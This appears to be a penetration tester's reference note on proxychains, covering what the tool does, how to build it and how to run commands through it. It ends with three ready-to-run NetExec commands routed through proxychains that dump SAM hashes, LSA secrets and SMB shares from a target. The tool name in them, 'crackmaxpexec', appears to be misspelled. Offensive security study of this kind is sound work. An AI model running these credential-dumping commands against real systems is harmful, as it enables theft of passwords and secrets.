# About
A tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: "user/pass" for SOCKS4/5, "basic" for HTTP.
## Links
[Github](https://github.com/haad/proxychains)
# Installing
- Source
```
git clone https://github.com/haad/proxychains.git && cd proxychains
./configure
make
sudo make install
```
# Usage
General
```
proxychains COMMAND
```

Passing various [[NetExec]] commands
- Dump SAM:
```
sudo proxychains crackmaxpexec smb ip -u user -p '' -d domain --sam
```

- Dump LSA:
```
sudo proxychains crackmaxpexec smb ip -u user -p '' -d domain --lsa
```

- Dump shares:
```
sudo proxychains crackmaxpexec smb ip -u user -p '' -d domain --shares
```